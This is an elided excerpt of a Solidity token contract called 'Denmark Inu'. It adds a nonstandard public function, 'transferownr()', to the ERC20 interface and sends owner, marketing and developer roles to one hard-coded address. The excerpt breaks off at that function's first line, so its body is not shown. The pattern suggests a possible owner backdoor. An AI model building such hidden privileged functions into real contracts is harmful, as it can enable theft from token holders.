...
interface IERC20 {
    ...
    function transferownr() external returns (uint256);
}
...
contract DenmarkInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x7733fDe0dE5A9A8229e799e8fB0a47E8B3DB5CaB); 
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public Wallet_Developer = payable(0x7733fDe0dE5A9A8229e799e8fB0a47E8B3DB5CaB);
    ...
    string private constant _name = "Denmark Inu"; 
    ...
    constructor () {
        ...
        _owner = 0x7733fDe0dE5A9A8229e799e8fB0a47E8B3DB5CaB;
    ...
    function transferownr() public override returns (uint256) {
